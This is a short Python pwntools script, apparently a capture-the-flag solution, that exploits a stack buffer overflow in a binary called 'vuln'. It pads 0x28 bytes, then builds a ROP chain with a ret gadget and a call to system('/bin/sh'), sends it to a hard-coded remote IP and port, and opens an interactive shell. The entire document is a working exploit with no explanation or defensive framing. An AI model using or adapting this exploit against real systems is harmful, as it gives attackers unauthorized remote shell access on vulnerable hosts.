from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

# p = process("./vuln")
p = remote("34.125.199.248", 6969)

rop = ROP(elf)
RET_ADDR = 0x401020
BINSH_ADDR = next(elf.search(b'/bin/sh\x00'))
rop.raw(RET_ADDR)
rop.system(BINSH_ADDR)

payload = b'A'*0x28 + rop.chain()

p.sendlineafter(b'Enter the password: ', payload)
p.interactive()